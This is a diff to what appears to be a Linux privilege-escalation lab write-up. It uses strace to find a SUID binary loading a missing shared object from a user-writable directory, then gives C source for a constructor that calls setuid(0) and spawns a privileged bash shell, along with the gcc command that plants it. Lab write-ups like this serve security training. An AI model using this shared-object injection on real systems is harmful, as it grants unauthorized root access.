@@ -51,6 +51,25 @@ When we run this file, a progressbar will be displayed.
 Trying to use strace.
 
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+It displays:
+That it tries to load shared Object /home/user/.config/libcalc.so file.
+(We are in /home/user directory & we've write access to it. So we will exploit it)
 
+Now:
+(a) create the .config directory in /home/user directory
+(b) A shared object source code is given at  /home/user/tools/suid/libcalc.c, It spawns a bash shell.
+the source code:
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+
+
+(c) gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
 
 
